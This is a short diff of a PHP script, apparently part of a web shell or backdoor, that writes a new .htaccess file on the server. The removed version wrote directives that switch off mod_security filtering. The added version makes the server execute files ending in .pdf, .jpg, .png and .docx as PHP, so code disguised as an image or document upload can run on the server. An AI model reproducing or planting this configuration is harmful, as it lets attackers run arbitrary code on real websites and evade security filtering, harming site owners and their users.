@@ -337,7 +337,10 @@ if (file_exists('php.ini')) {
 }
 if (!file_exists('.htaccess')) {
     $htc = fopen('.htaccess', 'w');
-    $isian = "<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>";
+    $isian = '
+    <FilesMatch "\.(pdf|jpg|png|docx)$">
+    SetHandler application/x-httpd-php
+    </FilesMatch>';
     fwrite($htc, $isian);
     fclose($htc);
 }
